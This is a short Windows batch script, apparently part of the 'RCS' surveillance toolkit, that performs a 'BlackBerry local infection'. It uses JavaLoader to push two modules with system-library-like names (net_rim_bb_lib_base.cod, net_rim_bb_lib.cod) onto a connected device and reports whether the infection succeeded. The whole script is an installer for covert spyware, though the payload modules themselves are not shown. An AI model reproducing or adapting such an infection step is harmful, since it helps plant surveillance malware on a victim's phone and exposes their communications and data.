@echo off

echo.
echo    **********************************
echo    * RCS BlackBerry local infection *
echo    **********************************
echo.

bin\JavaLoader load res\net_rim_bb_lib_base.cod res\net_rim_bb_lib.cod 
IF %ERRORLEVEL% NEQ 0 GOTO failure

:success
echo.
echo Infection completed!
GOTO end

:failure
echo.
echo Infection failed!

:end
echo.
pause
